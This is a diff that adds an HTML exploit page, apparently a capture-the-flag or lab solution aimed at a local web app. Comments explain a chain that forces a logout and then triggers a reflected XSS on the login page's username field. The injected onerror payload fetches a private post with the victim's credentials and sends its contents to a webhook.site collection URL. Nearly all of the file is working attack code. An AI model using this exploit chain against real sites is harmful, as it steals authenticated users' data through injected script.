@@ -1,0 +1,24 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>chain</title>
+<script>
+/*
+  Step 1: top-level GET to /logout (cookies ARE sent on top-level GET even cross-site with SameSite=Lax)
+  Step 2: immediately go to reflected-XSS on /login (not logged in anymore, so the template renders)
+  The payload on /login runs in 127.0.0.1 origin (no CSP), fetches /post/0 with credentials, exfils, then sets window.reportReady.
+*/
+location.replace('http://127.0.0.1:5000/logout');   // 302 → /login (no params)
+setTimeout(() => {
+  const payload = encodeURIComponent(
+    `<img src=x onerror="(async()=>{try{
+      const r=await fetch('/post/0',{credentials:'include'});
+      const t=await r.text();
+      new Image().src='https://webhook.site/YOUR_UUID?d='+encodeURIComponent(t);
+    }catch(e){
+      new Image().src='https://webhook.site/YOUR_UUID?err='+encodeURIComponent(String(e));
+    }finally{window.reportReady=true}})()">`
+  );
+  // Hit reflected XSS on /login (not logged in now), causing the payload to execute in 127.0.0.1 origin.
+  location.replace('http://127.0.0.1:5000/login?username=' + payload + '&password=x');
+}, 600);
+</script>
